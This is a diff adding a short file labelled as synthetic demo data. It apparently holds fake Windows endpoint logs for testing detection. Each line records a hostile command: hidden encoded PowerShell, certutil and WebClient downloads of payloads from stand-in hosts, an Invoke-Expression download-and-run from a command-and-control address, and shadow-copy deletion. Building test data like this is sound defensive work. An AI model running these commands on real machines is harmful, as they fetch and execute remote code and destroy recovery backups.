@@ -1,0 +1,6 @@
+# Synthetic Demo Data - Safe for testing and demonstration purposes
+2026-09-17T14:10:01Z host=WIN-DC01 user=SYSTEM process=powershell.exe command="powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -enc SQBFAFgA"
+2026-09-17T14:10:05Z host=WIN-DC01 user=Administrator process=cmd.exe command="certutil -urlcache -split -f http://evil-cdn.example/agent.exe C:\Windows\Temp\agent.exe"
+2026-09-17T14:10:10Z host=WIN-DC01 user=Administrator process=powershell.exe command="powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://198.51.100.4/dropper.bin','C:\\Temp\\dropper.bin')"
+2026-09-17T14:10:15Z host=WIN-DC01 user=Administrator process=cmd.exe command="vssadmin delete shadows /all /quiet"
+2026-09-17T14:10:20Z host=WIN-DC01 user=Administrator process=powershell.exe command="Invoke-Expression (New-Object Net.WebClient).DownloadString('http://c2.example/beacon.ps1')"
